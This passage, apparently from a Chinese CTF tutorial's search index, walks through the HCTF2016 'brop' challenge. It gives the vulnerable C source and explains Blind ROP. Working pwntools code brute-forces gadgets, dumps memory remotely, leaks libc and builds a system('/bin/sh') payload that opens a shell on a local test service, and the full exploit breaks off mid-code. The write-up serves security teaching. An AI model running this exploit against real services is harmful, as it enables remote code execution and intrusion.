\n10001\n)\n\n\np\n.\nrecvline\n()\n\n\np\n.\nsendline\n(\npayload\n)\n\n\np\n.\ninteractive\n()\n\n\n\n\n\u53c2\u8003\u8d44\u6599\n\n\n\n\nBlind Return Oriented Programming (BROP)\n\n\nBlind Return Oriented Programming (BROP) Attack (1)", 
            "title": "HCTF2016 brop"
        }, 
        {
            "location": "/pwn/lab/6.1.1_pwn_hctf2016_brop/#_1", 
            "text": "\u51fa\u9898\u4eba\u5728 github \u4e0a\u5f00\u6e90\u4e86\u4ee3\u7801\uff0c \u51fa\u9898\u4eba\u5931\u8e2a\u4e86 \u3002\u5982\u4e0b\uff1a #include   stdio.h  #include   unistd.h  #include   string.h  int   i ;  int   check ();  int   main ( void )   { \n     setbuf ( stdin ,   NULL ); \n     setbuf ( stdout ,   NULL ); \n     setbuf ( stderr ,   NULL ); \n\n     puts ( WelCome my friend,Do you know password? ); \n         if ( ! check ())   { \n             puts ( Do not dump my memory ); \n         }   else   { \n             puts ( No password, no game ); \n         }  }  int   check ()   { \n     char   buf [ 50 ]; \n     read ( STDIN_FILENO ,   buf ,   1024 ); \n     return   strcmp ( buf ,   aslvkm;asd;alsfm;aoeim;wnv;lasdnvdljasd;flk );  }  \n\u4f7f\u7528\u4e0b\u9762\u7684\u8bed\u53e5\u7f16\u8bd1\uff0c\u7136\u540e\u8fd0\u884c\u8d77\u6765\uff1a $ gcc -z noexecstack -fno-stack-protector -no-pie brop.c \nchecksec \u5982\u4e0b\uff1a $ checksec -f a.out\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY  Fortified Fortifiable  FILE\nPartial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No       0               2       a.out \n\u7531\u4e8e socat \u5728\u7a0b\u5e8f\u5d29\u6e83\u65f6\u4f1a\u65ad\u5f00\u8fde\u63a5\uff0c\u6211\u4eec\u5199\u4e00\u4e2a\u5c0f\u811a\u672c\uff0c\u8ba9\u7a0b\u5e8f\u5728\u5d29\u6e83\u540e\u7acb\u5373\u91cd\u542f\uff0c\u8fd9\u6837\u5c31\u6a21\u62df\u51fa\u4e86\u8fdc\u7a0b\u73af\u5883  127.0.0.1:10001 \uff1a #!/bin/sh  while  true ;   do \n         num = ` ps -ef  |  grep  socat   |  grep -v  grep   |  wc -l ` \n         if   [   $num  -lt  5   ] ;   then \n                socat tcp4-listen:10001,reuseaddr,fork exec:./a.out  \n         fi  done  \n\u5728\u4e00\u4e2a\u5355\u72ec\u7684 shell \u4e2d\u8fd0\u884c\u5b83\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u7b80\u5355\u6a21\u62df\u51fa\u4e86\u6bd4\u8d5b\u65f6\u7684\u73af\u5883\uff0c\u5373\u4ec5\u63d0\u4f9b ip \u548c\u7aef\u53e3\u3002\uff08\u4e0d\u505c\u5730\u65ad\u5f00\u91cd\u8fde\u7279\u522b\u8017CPU\uff0c\u5efa\u8bae\u5728\u670d\u52a1\u5668\u4e0a\u8dd1\uff09", 
            "title": "\u9898\u76ee\u590d\u73b0"
        }, 
        {
            "location": "/pwn/lab/6.1.1_pwn_hctf2016_brop/#brop", 
            "text": "BROP \u5373 Blind ROP\uff0c\u9700\u8981\u6211\u4eec\u5728\u65e0\u6cd5\u83b7\u5f97\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u60c5\u51b5\u4e0b\uff0c\u901a\u8fc7 ROP \u8fdb\u884c\u8fdc\u7a0b\u653b\u51fb\uff0c\u52ab\u6301\u8be5\u5e94\u7528\u7a0b\u5e8f\u7684\u63a7\u5236\u6d41\uff0c\u53ef\u7528\u4e8e\u5f00\u542f\u4e86 ASLR\u3001NX \u548c\u6808 canary \u7684 64-bit Linux\u3002\u8fd9\u4e00\u6982\u5ff5\u662f\u662f\u5728 2014 \u5e74\u63d0\u51fa\u7684\uff0c\u8bba\u6587\u548c\u5e7b\u706f\u7247\u5728\u53c2\u8003\u8d44\u6599\u4e2d\u3002  \u5b9e\u73b0\u8fd9\u4e00\u653b\u51fb\u6709\u4e24\u4e2a\u5fc5\u8981\u6761\u4ef6\uff1a\n1. \u76ee\u6807\u7a0b\u5e8f\u5b58\u5728\u4e00\u4e2a\u6808\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u5e76\u4e14\u6211\u4eec\u77e5\u9053\u600e\u6837\u53bb\u89e6\u53d1\u5b83\n2. \u76ee\u6807\u8fdb\u7a0b\u5728\u5d29\u6e83\u540e\u4f1a\u7acb\u5373\u91cd\u542f\uff0c\u5e76\u4e14\u91cd\u542f\u540e\u8fdb\u7a0b\u88ab\u52a0\u8f7d\u7684\u5730\u5740\u4e0d\u53d8\uff0c\u8fd9\u6837\u5373\u4f7f\u76ee\u6807\u673a\u5668\u5f00\u542f\u4e86 ASLR \u4e5f\u6ca1\u6709\u5f71\u54cd\u3002  \u4e0b\u9762\u6211\u4eec\u7ed3\u5408\u9898\u76ee\u6765\u8bb2\u4e00\u8bb2\u3002", 
            "title": "BROP \u539f\u7406\u53ca\u9898\u76ee\u89e3\u6790"
        }, 
        {
            "location": "/pwn/lab/6.1.1_pwn_hctf2016_brop/#_2", 
            "text": "\u9996\u5148\u662f\u8981\u627e\u5230\u6808\u6ea2\u51fa\u7684\u6f0f\u6d1e\uff0c\u8001\u529e\u6cd5\u4ece 1 \u4e2a\u5b57\u7b26\u5f00\u59cb\uff0c\u66b4\u529b\u679a\u4e3e\uff0c\u76f4\u5230\u5b83\u5d29\u6e83\u3002 def   get_buffer_size (): \n     for   i   in   range ( 100 ): \n         payload    =   A \n         payload   +=   A * i \n         buf_size   =   len ( payload )   -   1 \n         try : \n             p   =   remote ( 127.0.0.1 ,   10001 ) \n             p . recvline () \n             p . send ( payload ) \n             p . recv () \n             p . close () \n             log . info ( bad:  %d   %   buf_size ) \n         except   EOFError   as   e : \n             p . close () \n             log . info ( buffer size:  %d   %   buf_size ) \n             return   buf_size   [*] buffer size: 72 \n\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5d29\u6e83\u610f\u5473\u7740\u6211\u4eec\u8986\u76d6\u5230\u4e86\u8fd4\u56de\u5730\u5740\uff0c\u6240\u4ee5\u7f13\u51b2\u533a\u5e94\u8be5\u662f\u53d1\u9001\u7684\u5b57\u7b26\u6570\u51cf\u4e00\uff0c\u5373 buf(64)+ebp(8)=72\u3002\u8be5\u9898\u5e76\u6ca1\u6709\u5f00\u542f canary\uff0c\u6240\u4ee5\u8df3\u8fc7\u7206\u7834\u7684\u8fc7\u7a0b\u3002", 
            "title": "\u6808\u6ea2\u51fa"
        }, 
        {
            "location": "/pwn/lab/6.1.1_pwn_hctf2016_brop/#stop-gadget", 
            "text": "\u5728\u5bfb\u627e\u901a\u7528 gadget \u4e4b\u524d\uff0c\u6211\u4eec\u9700\u8981\u4e00\u4e2a stop gadget\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u5f53\u6211\u4eec\u628a\u8fd4\u56de\u5730\u5740\u8986\u76d6\u540e\uff0c\u7a0b\u5e8f\u6709\u5f88\u5927\u7684\u51e0\u7387\u4f1a\u6302\u6389\uff0c\u56e0\u4e3a\u6240\u8986\u76d6\u7684\u5730\u5740\u53ef\u80fd\u5e76\u4e0d\u662f\u5408\u6cd5\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u80fd\u591f\u4f7f\u7a0b\u5e8f\u6b63\u5e38\u8fd4\u56de\u7684\u5730\u5740\uff0c\u79f0\u4f5c stop gadget\uff0c\u8fd9\u4e00\u6b65\u81f3\u5173\u91cd\u8981\u3002stop gadget \u53ef\u80fd\u4e0d\u6b62\u4e00\u4e2a\uff0c\u8fd9\u91cc\u6211\u4eec\u4e4b\u95f4\u8fd4\u56de\u627e\u5230\u7684\u7b2c\u4e00\u4e2a\u597d\u4e86\uff1a def   get_stop_addr ( buf_size ): \n     addr   =   0x400000 \n     while   True : \n         sleep ( 0.1 ) \n         addr   +=   1 \n         payload    =   A * buf_size \n         payload   +=   p64 ( addr ) \n         try : \n             p   =   remote ( 127.0.0.1 ,   10001 ) \n             p . recvline () \n             p . sendline ( payload ) \n             p . recvline () \n             p . close () \n             log . info ( stop address: 0x %x   %   addr ) \n             return   addr \n         except   EOFError   as   e : \n             p . close () \n             log . info ( bad: 0x %x   %   addr ) \n         except : \n             log . info ( Can t connect ) \n             addr   -=   1  \n\u7531\u4e8e\u6211\u4eec\u5728\u672c\u5730\u7684\u5b88\u62a4\u811a\u672c\u7565\u7b80\u964b\uff0c\u5728\u7a0b\u5e8f\u6302\u6389\u548c\u91cd\u65b0\u542f\u52a8\u4e4b\u95f4\u5b58\u5728\u4e00\u5b9a\u7684\u65f6\u95f4\u5dee\uff0c\u6240\u4ee5\u8fd9\u91cc  sleep(0.1)  \u505a\u4e00\u5b9a\u7684\u7f13\u51b2\uff0c\u5982\u679c\u8fd8\u662f\u51b2\u7a81\uff0c\u5728  except  \u8fdb\u884c\u5904\u7406\uff0c\u540e\u9762\u7684\u4ee3\u7801\u4e5f\u4e00\u6837\u3002 [*] stop address: 0x4005e5", 
            "title": "stop gadget"
        }, 
        {
            "location": "/pwn/lab/6.1.1_pwn_hctf2016_brop/#common-gadget", 
            "text": "\u6709\u4e86 stop gadget\uff0c\u90a3\u4e9b\u539f\u672c\u4f1a\u5bfc\u81f4\u7a0b\u5e8f\u5d29\u6e83\u7684\u5730\u5740\u8fd8\u662f\u4e00\u6837\u4f1a\u5bfc\u81f4\u5d29\u6e83\uff0c\u4f46\u90a3\u4e9b\u6b63\u5e38\u8fd4\u56de\u7684\u5730\u5740\u5219\u4f1a\u901a\u8fc7 stop gadget \u8fdb\u5165\u88ab\u6302\u8d77\u7684\u72b6\u6001\u3002\u4e0b\u9762\u6211\u4eec\u5c31\u53ef\u4ee5\u5bfb\u627e\u5176\u4ed6\u53ef\u5229\u7528\u7684 gadget\uff0c\u7531\u4e8e\u662f 64 \u4f4d\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u8003\u8651\u4f7f\u7528\u901a\u7528 gadget\uff08\u6709\u5173\u8be5\u5185\u5bb9\u8bf7\u53c2\u89c1\u7ae0\u82824.7\uff09\uff1a def   get_gadgets_addr ( buf_size ,   stop_addr ): \n     addr   =   stop_addr \n     while   True : \n         sleep ( 0.1 ) \n         addr   +=   1 \n         payload    =   A * buf_size \n         payload   +=   p64 ( addr ) \n         payload   +=   p64 ( 1 )   +   p64 ( 2 )   +   p64 ( 3 )   +   p64 ( 4 )   +   p64 ( 5 )   +   p64 ( 6 ) \n         payload   +=   p64 ( stop_addr ) \n         try : \n             p   =   remote ( 127.0.0.1 ,   10001 ) \n             p . recvline () \n             p . sendline ( payload ) \n             p . recvline () \n             p . close () \n             log . info ( find address: 0x %x   %   addr ) \n             try :      # check \n                 payload    =   A * buf_size \n                 payload   +=   p64 ( addr ) \n                 payload   +=   p64 ( 1 )   +   p64 ( 2 )   +   p64 ( 3 )   +   p64 ( 4 )   +   p64 ( 5 )   +   p64 ( 6 ) \n\n                 p   =   remote ( 127.0.0.1 ,   10001 ) \n                 p . recvline () \n                 p . sendline ( payload ) \n                 p . recvline () \n                 p . close () \n                 log . info ( bad address: 0x %x   %   addr ) \n             except : \n                 p . close () \n                 log . info ( gadget address: 0x %x   %   addr ) \n                 return   addr \n         except   EOFError   as   e : \n             p . close () \n             log . info ( bad: 0x %x   %   addr ) \n         except : \n             log . info ( Can t connect ) \n             addr   -=   1  \n\u76f4\u63a5\u4ece stop gadget \u7684\u5730\u65b9\u5f00\u59cb\u641c\u7d22\u5c31\u53ef\u4ee5\u4e86\u3002\u53e6\u5916\uff0c\u627e\u5230\u4e00\u4e2a\u6b63\u5e38\u8fd4\u56de\u7684\u5730\u5740\u4e4b\u540e\uff0c\u9700\u8981\u8fdb\u884c\u68c0\u67e5\uff0c\u4ee5\u786e\u5b9a\u662f\u5b83\u786e\u5b9e\u662f\u901a\u7528 gadget\u3002 [*] gadget address: 0x40082a \n\u6709\u4e86\u901a\u7528 gadget\uff0c\u5c31\u53ef\u4ee5\u5f97\u5230  pop rdi; ret  \u7684\u5730\u5740\u4e86\uff0c\u5373 gadget address + 9\u3002", 
            "title": "common gadget"
        }, 
        {
            "location": "/pwn/lab/6.1.1_pwn_hctf2016_brop/#putsplt", 
            "text": "plt \u8868\u5177\u6709\u6bd4\u8f83\u89c4\u6574\u7684\u7ed3\u6784\uff0c\u6bcf\u4e00\u4e2a\u8868\u9879\u90fd\u662f 16 \u5b57\u8282\uff0c\u800c\u5728\u6bcf\u4e2a\u8868\u9879\u7684 6 \u5b57\u8282\u504f\u79fb\u5904\uff0c\u662f\u8be5\u8868\u9879\u5bf9\u5e94\u51fd\u6570\u7684\u89e3\u6790\u8def\u5f84\uff0c\u6240\u4ee5\u5148\u5f97\u5230 plt \u5730\u5740\uff0c\u7136\u540e dump \u51fa\u5185\u5b58\uff0c\u5c31\u53ef\u4ee5\u627e\u5230 got \u5730\u5740\u3002  \u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 puts \u51fd\u6570\u6765 dump \u5185\u5b58\uff0c\u6bd4\u8d77 write\uff0c\u5b83\u53ea\u9700\u8981\u4e00\u4e2a\u53c2\u6570\uff0c\u5f88\u65b9\u4fbf\uff1a def   get_puts_plt ( buf_size ,   stop_addr ,   gadgets_addr ): \n     pop_rdi   =   gadgets_addr   +   9        # pop rdi; ret; \n     addr   =   stop_addr \n     while   True : \n         sleep ( 0.1 ) \n         addr   +=   1 \n\n         payload    =   A * buf_size \n         payload   +=   p64 ( pop_rdi ) \n         payload   +=   p64 ( 0x400000 ) \n         payload   +=   p64 ( addr ) \n         payload   +=   p64 ( stop_addr ) \n         try : \n             p   =   remote ( 127.0.0.1 ,   10001 ) \n             p . recvline () \n             p . sendline ( payload ) \n             if   p . recv () . startswith ( \\x7f ELF ): \n                 log . info ( puts@plt address: 0x %x   %   addr ) \n                 p . close () \n                 return   addr \n             log . info ( bad: 0x %x   %   addr ) \n             p . close () \n         except   EOFError   as   e : \n             p . close () \n             log . info ( bad: 0x %x   %   addr ) \n         except : \n             log . info ( Can t connect ) \n             addr   -=   1  \n\u8fd9\u91cc\u8ba9 puts \u6253\u5370\u51fa  0x400000  \u5730\u5740\u5904\u7684\u5185\u5bb9\uff0c\u56e0\u4e3a\u8fd9\u91cc\u901a\u5e38\u662f\u7a0b\u5e8f\u5934\u7684\u4f4d\u7f6e\uff08\u5173\u95edPIE\uff09\uff0c\u4e14\u524d\u56db\u4e2a\u5b57\u7b26\u4e3a  \\x7fELF \uff0c\u65b9\u4fbf\u8fdb\u884c\u9a8c\u8bc1\u3002 [*] puts@plt address: 0x4005e7 \n\u6210\u529f\u627e\u5230\u4e00\u4e2a\u5730\u5740\uff0c\u5b83\u786e\u5b9e\u8c03\u7528 puts\uff0c\u6253\u5370\u51fa\u4e86  \\x7fELF \uff0c\u90a3\u5b83\u771f\u7684\u5c31\u662f puts@plt \u7684\u5730\u5740\u5417\uff0c\u4e0d\u4e00\u5b9a\uff0c\u770b\u4e00\u4e0b\u5457\uff0c\u53cd\u6b63\u6211\u4eec\u6709\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002 gdb-peda$ disassemble /r 0x4005f0\nDump of assembler code for function puts@plt:\n   0x00000000004005f0  +0 :     ff 25 22 0a 20 00       jmp    QWORD PTR [rip+0x200a22]        # 0x601018\n   0x00000000004005f6  +6 :     68 00 00 00 00  push   0x0\n   0x00000000004005fb  +11 :    e9 e0 ff ff ff  jmp    0x4005e0\nEnd of assembler dump. \n\u4e0d\u5bf9\u5440\uff0cputs@plt \u660e\u660e\u662f\u5728  0x4005f0 \uff0c\u90a3\u4e48  0x4005e7  \u662f\u4ec0\u4e48\u9b3c\u3002 gdb-peda$ pdisass /r 0x4005e7,0x400600\nDump of assembler code from 0x4005e7 to 0x400600:\n   0x00000000004005e7:  25 24 0a 20 00  and    eax,0x200a24\n   0x00000000004005ec:  0f 1f 40 00     nop    DWORD PTR [rax+0x0]\n   0x00000000004005f0  puts@plt+0 :     ff 25 22 0a 20 00       jmp    QWORD PTR [rip+0x200a22]        # 0x601018\n   0x00000000004005f6  puts@plt+6 :     68 00 00 00 00  push   0x0\n   0x00000000004005fb  puts@plt+11 :    e9 e0 ff ff ff  jmp    0x4005e0\nEnd of assembler dump. \n\u539f\u6765\u662f\u7531\u4e8e\u53cd\u6c47\u7f16\u65f6\u5019\u7684\u504f\u79fb\uff0c\u5bfc\u81f4\u4e86\u8fd9\u4e2a\u95ee\u9898\uff0c\u5f53\u7136\u4e86\u524d\u4e24\u53e5\u5bf9\u540e\u9762\u7684 puts \u8bed\u53e5\u5e76\u6ca1\u6709\u4ec0\u4e48\u5f71\u54cd\uff0c\u5ffd\u7565\u5b83\uff0c\u5728\u540e\u9762\u7684\u4ee3\u7801\u4e2d\u7ee7\u7eed\u4f7f\u7528  0x4005e7 \u3002", 
            "title": "puts@plt"
        }, 
        {
            "location": "/pwn/lab/6.1.1_pwn_hctf2016_brop/#remote-dump", 
            "text": "\u6709\u4e86 puts\uff0c\u6709\u4e86 gadget\uff0c\u5c31\u53ef\u4ee5\u7740\u624b dump \u7a0b\u5e8f\u4e86\uff1a def   dump_memory ( buf_size ,   stop_addr ,   gadgets_addr ,   puts_plt ,   start_addr ,   end_addr ): \n     pop_rdi    =   gadgets_addr   +   9       # pop rdi; ret \n\n     result   =   \n     while   start_addr     end_addr : \n         #print result.encode( hex ) \n         sleep ( 0.1 ) \n         payload    =   A * buf_size \n         payload   +=   p64 ( pop_rdi ) \n         payload   +=   p64 ( start_addr ) \n         payload   +=   p64 ( puts_plt ) \n         payload   +=   p64 ( stop_addr ) \n         try : \n             p   =   remote ( 127.0.0.1 ,   10001 ) \n             p . recvline () \n             p . sendline ( payload ) \n             data   =   p . recv ( timeout = 0.1 )        # timeout makes sure to recive all bytes \n             if   data   ==   \\n : \n                 data   =   \\x00 \n             elif   data [ - 1 ]   ==   \\n : \n                 data   =   data [: - 1 ] \n             log . info ( leaking: 0x %x  --   %s   %   ( start_addr ,( data   or   ) . encode ( hex ))) \n             result   +=   data \n             start_addr   +=   len ( data ) \n             p . close () \n         except : \n             log . info ( Can t connect ) \n     return   result  \n\u6211\u4eec\u77e5\u9053 puts \u51fd\u6570\u901a\u8fc7  \\x00  \u8fdb\u884c\u622a\u65ad\uff0c\u5e76\u4e14\u4f1a\u5728\u6bcf\u4e00\u6b21\u8f93\u51fa\u672b\u5c3e\u52a0\u4e0a\u6362\u884c\u7b26  \\x0a \uff0c\u6240\u4ee5\u6709\u4e00\u4e9b\u7279\u6b8a\u60c5\u51b5\u9700\u8981\u505a\u4e00\u4e9b\u5904\u7406\uff0c\u6bd4\u5982\u5355\u72ec\u7684  \\x00 \u3001 \\x0a  \u7b49\uff0c\u9996\u5148\u5f53\u7136\u662f\u5148\u53bb\u6389\u672b\u5c3e puts \u81ea\u52a8\u52a0\u4e0a\u7684  \\n \uff0c\u7136\u540e\u5982\u679c recv \u5230\u4e00\u4e2a  \\n \uff0c\u8bf4\u660e\u5185\u5b58\u4e2d\u662f  \\x00 \uff0c\u5982\u679c recv \u5230\u4e00\u4e2a  \\n\\n \uff0c\u8bf4\u660e\u5185\u5b58\u4e2d\u662f  \\x0a \u3002 p.recv(timeout=0.1)  \u662f\u7531\u4e8e\u51fd\u6570\u672c\u8eab\u7684\u8bbe\u5b9a\uff0c\u5982\u679c\u6709  \\n\\n \uff0c\u5b83\u5f88\u53ef\u80fd\u5728\u6536\u5230\u7b2c\u4e00\u4e2a  \\n  \u65f6\u5c31\u8fd4\u56de\u4e86\uff0c\u52a0\u4e0a\u53c2\u6570\u53ef\u4ee5\u8ba9\u5b83\u5168\u90e8\u63a5\u6536\u5b8c\u3002  \u8fd9\u91cc\u9009\u62e9\u4ece  0x400000  dump\u5230  0x401000 \uff0c\u8db3\u591f\u4e86\uff0c\u4f60\u8fd8\u53ef\u4ee5 dump \u4e0b data \u6bb5\u7684\u6570\u636e\uff0c\u5927\u6982\u4ece  0x600000  \u5f00\u59cb\u3002", 
            "title": "remote dump"
        }, 
        {
            "location": "/pwn/lab/6.1.1_pwn_hctf2016_brop/#putsgot", 
            "text": "\u62ff\u5230 dump \u4e0b\u6765\u7684\u6587\u4ef6\uff0c\u4f7f\u7528 Radare2 \u6253\u5f00\uff0c\u4f7f\u7528\u53c2\u6570  -B  \u6307\u5b9a\u7a0b\u5e8f\u57fa\u5730\u5740\uff0c\u7136\u540e\u53cd\u6c47\u7f16  puts@plt  \u7684\u4f4d\u7f6e  0x4005e7 \uff0c\u5f53\u7136\u4f60\u8981\u76f4\u63a5\u53cd\u6c47\u7f16  0x4005f0  \u4e5f\u884c\uff1a $ r2 -B 0x400000 code.bin\n[0x00400630]  pd 14 @ 0x4005e7\n     ::::   0x004005e7      25240a2000     and eax, 0x200a24                                                                                                                          \n     ::::   0x004005ec      0f1f4000       nop dword [rax]                                                                                                                            \n     ::::   0x004005f0      ff25220a2000   jmp qword [0x00601018]      ; [0x601018:8]=-1                                                                                              \n     ::::   0x004005f6      6800000000     push 0                                                                                                                                     \n     `====  0x004005fb      e9e0ffffff     jmp 0x4005e0                                                                                                                               \n      :::   0x00400600      ff251a0a2000   jmp qword [0x00601020]      ; [0x601020:8]=-1                                                                                              \n      :::   0x00400606      6801000000     push 1                      ; 1                                                                                                            \n      `===  0x0040060b      e9d0ffffff     jmp 0x4005e0                                                                                                                               \n       ::   0x00400610      ff25120a2000   jmp qword [0x00601028]      ; [0x601028:8]=-1                                                                                              \n       ::   0x00400616      6802000000     push 2                      ; 2                                                                                                            \n       `==  0x0040061b      e9c0ffffff     jmp 0x4005e0                                                                                                                               \n        :   0x00400620      ff250a0a2000   jmp qword [0x00601030]      ; [0x601030:8]=-1                                                                                              \n        :   0x00400626      6803000000     push 3                      ; 3                                                                                                            \n        `=  0x0040062b      e9b0ffffff     jmp 0x4005e0 \n\u4e8e\u662f\u6211\u4eec\u5c31\u5f97\u5230\u4e86 puts@got \u5730\u5740  0x00601018 \u3002\u53ef\u4ee5\u770b\u5230\u8be5\u8868\u4e2d\u8fd8\u6709\u5176\u4ed6\u51e0\u4e2a\u51fd\u6570\uff0c\u6839\u636e\u7a0b\u5e8f\u7684\u529f\u80fd\u5927\u6982\u53ef\u4ee5\u731c\u5230\uff0c\u65e0\u975e\u5c31\u662f setbuf\u3001read \u4e4b\u7c7b\u7684\uff0c\u5728\u540e\u9762\u7684\u8fc7\u7a0b\u4e2d\u5982\u679c\u5b9e\u5728\u65e0\u6cd5\u786e\u5b9a libc\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4f1a\u6709\u7528\u3002", 
            "title": "puts@got"
        }, 
        {
            "location": "/pwn/lab/6.1.1_pwn_hctf2016_brop/#attack", 
            "text": "\u540e\u9762\u7684\u8fc7\u7a0b\u548c\u65e0 libc \u7684\u5229\u7528\u5dee\u4e0d\u591a\u4e86\uff0c\u5148\u4f7f\u7528 puts \u6253\u5370\u51fa\u5176\u5728\u5185\u5b58\u4e2d\u7684\u5730\u5740\uff0c\u7136\u540e\u5728 libc-database \u91cc\u67e5\u627e\u76f8\u5e94\u7684 libc\uff0c\u4e5f\u5c31\u662f\u76ee\u6807\u673a\u5668\u4e0a\u7684 libc\uff0c\u901a\u8fc7\u504f\u79fb\u8ba1\u7b97\u51fa  system()  \u51fd\u6570\u548c\u5b57\u7b26\u4e32  /bin/sh  \u7684\u5730\u5740\uff0c\u6784\u9020 payload \u5c31\u53ef\u4ee5\u4e86\u3002  def   get_puts_addr ( buf_size ,   stop_addr ,   gadgets_addr ,   puts_plt ,   puts_got ): \n     pop_rdi    =   gadgets_addr   +   9 \n\n     payload    =   A * buf_size \n     payload   +=   p64 ( pop_rdi ) \n     payload   +=   p64 ( puts_got ) \n     payload   +=   p64 ( puts_plt ) \n     payload   +=   p64 ( stop_addr ) \n\n     p   =   remote ( 127.0.0.1 ,   10001 ) \n     p . recvline () \n     p . sendline ( payload ) \n     data   =   p . recvline () \n     data   =   u64 ( data [: - 1 ]   +   \\x00\\x00 ) \n     log . info ( puts address: 0x %x   %   data ) \n     p . close () \n\n     return   data   [*] puts address: 0x7ffff7a90210  \u8fd9\u91cc\u63d2\u4e00\u4e0b  libc-database  \u7684\u7528\u6cd5\uff0c\u7531\u4e8e\u6211\u672c\u5730\u7684 libc \u7248\u672c\u6bd4\u8f83\u65b0\uff0c\u53ef\u80fd\u672a\u6536\u5f55\uff0c\u5c31\u76f4\u63a5\u5c06\u5b83\u6dfb\u52a0\u8fdb\u53bb\u597d\u4e86\uff1a $ ./add /usr/lib/libc-2.26.so   \nAdding local libc /usr/lib/libc-2.26.so (id local-e112b79b632f33fce6908f5ffd2f61a5d8058570  /usr/lib/libc-2.26.so)\n  -  Writing libc to db/local-e112b79b632f33fce6908f5ffd2f61a5d8058570.so\n  -  Writing symbols to db/local-e112b79b632f33fce6908f5ffd2f61a5d8058570.symbols\n  -  Writing version info \n\u7136\u540e\u67e5\u8be2\uff08ASLR \u5e76\u4e0d\u5f71\u54cd\u540e 12 \u4f4d\u7684\u503c\uff09\uff1a $ ./find puts 210\n/usr/lib/libc-2.26.so (id local-e112b79b632f33fce6908f5ffd2f61a5d8058570)\n$ ./dump local-e112b79b632f33fce6908f5ffd2f61a5d8058570\noffset___libc_start_main_ret = 0x20f6a\noffset_system = 0x0000000000042010\noffset_dup2 = 0x00000000000e8100\noffset_read = 0x00000000000e7820\noffset_write = 0x00000000000e78c0\noffset_str_bin_sh = 0x17aff5\n$ ./dump local-e112b79b632f33fce6908f5ffd2f61a5d8058570 puts\noffset_puts = 0x000000000006f210  offset_puts     =   0x000000000006f210  offset_system   =   0x0000000000042010  offset_str_bin_sh   =   0x17aff5  system_addr   =   ( puts_addr   -   offset_puts )   +   offset_system  binsh_addr    =   ( puts_addr   -   offset_puts )   +   offset_str_bin_sh  # get shell  payload    =   A * buf_size  payload   +=   p64 ( gadgets_addr   +   9 )      # pop rdi; ret;  payload   +=   p64 ( binsh_addr )  payload   +=   p64 ( system_addr )  payload   +=   p64 ( stop_addr )  p   =   remote ( 127.0.0.1 ,   10001 )  p . recvline ()  p . sendline ( payload )  p . interactive ()  \nBingo!!! $ python2 exp.py\n[+] Opening connection to 127.0.0.1 on port 10001: Done\n[*] Switching to interactive mode\n$ whoami\nfirmy", 
            "title": "attack"
        }, 
        {
            "location": "/pwn/lab/6.1.1_pwn_hctf2016_brop/#exploit", 
            "text": "\u5b8c\u6574\u7684 exp \u5982\u4e0b\uff1a from   pwn   import   *  #context.log_level =  debug  def   get_buffer_size (): \n     for   i   in   range ( 100 ): \n         payload    =   A \n         payload   +=   A * i \n         buf_size   =   len ( payload )   -   1 \n         try : \n             p   =   remote ( 127.0.0.1 ,   10001 ) \n             p . recvline () \n             p . send ( payload ) \n             p . recv () \n             p . close () \n             log . info ( bad:  %d   %   buf_size ) \n         except   EOFError   as   e : \n             p . close () \n             log . info ( buffer size:  %d   %   buf_size ) \n             return   buf_size  def   get_stop_addr ( buf_size ): \n     addr   =   0x400000 \n     while   True : \n         sleep ( 0.1 ) \n         addr   +=   1 \n         payload    =   A * buf_size \n         payload   +=   p64 ( addr ) \n         try : \n             p   =   remote ( 127.0.0.1 ,   10001 ) \n             p . recvline () \n             p . sendline ( payload ) \n             p . recvline () \n             p . close () \n             log . info ( stop address: 0x %x   %   addr ) \n             return   addr \n         except   EOFError   as   e : \n             p . close () \n             log . info ( bad: 0x %x   %   addr ) \n         except : \n             log . info ( Can t connect ) \n             addr   -=   1  def   get_gadgets_addr ( buf_size ,   stop_addr ): \n     addr   =   stop_addr \n     while   True : \n         sleep ( 0.1 ) \n         addr   +=   1 \n         payload    =   A * buf_size \n         payload   +=   p64 ( addr ) \n         payload   +=   p64 ( 1 )   +   p64 ( 2 )   +   p64 ( 3 )   +   p64 ( 4 )   +   p64 ( 5 )   +   p64 ( 6 ) \n         payload   +=   p64 ( stop_addr ) \n         try : \n             p   =   remote ( 127.0.0.1 ,   10001 ) \n             p . recvline () \n             p . sendline ( payload ) \n             p . recvline () \n             p . close () \n             log . info ( find address: 0x %x   %   addr ) \n             try :      # check \n                 payload    =   A * buf_size \n                 payload   +=   p64 ( addr ) \n                 payload   +=   p64 ( 1 )   +   p64 ( 2 )   +   p64 ( 3 )   +   p64 ( 4 )   +   p64 ( 5 )   +   p64 ( 6 ) \n\n                 p   =   remote ( 127.0.0.1 ,   10001 ) \n                 p . recvline () \n                 p . sendline ( payload ) \n                 p . recvline () \n                 p . close () \n                 log . info ( bad address: 0x %x   %   addr ) \n             except : \n                 p . close () \n                 log . info ( gadget address: 0x %x   %   addr ) \n                 return   addr \n         except   EOFError   as   e : \n             p . close () \n             log . info ( bad: 0x %x   %   addr ) \n         except : \n             log . info ( Can t connect ) \n             addr   -=   1  def   get_puts_plt ( buf_size ,   stop_addr ,   gadgets_addr ): \n     pop_rdi   =   gadgets_addr   +   9        # pop rdi; ret; \n     addr   =   stop_addr \n     while   True : \n         sleep ( 0.1 ) \n         addr   +=   1 \n\n         payload    =   A * buf_size \n         payload   +=   p64 ( pop_rdi ) \n         payload   +=   p64 ( 0x400000 ) \n         payload   +=   p64 ( addr ) \n         payload   +=   p64 ( stop_addr ) \n         try : \n             p   =   remote ( 127.0.0.1 ,   10001 ) \n             p . recvline () \n             p . sendline ( payload ) \n             if   p . recv () . startswith ( \\x7f ELF ): \n                 log . info ( puts@plt address: 0x %x   %   addr ) \n                 p . close () \n                 return   addr \n             log . info ( bad: 0x %x   %   addr ) \n             p . close () \n         except   EOFError   as   e : \n             p . close () \n             log . info ( bad: 0x %x   %   addr ) \n         except : \n             log . info ( Can t connect 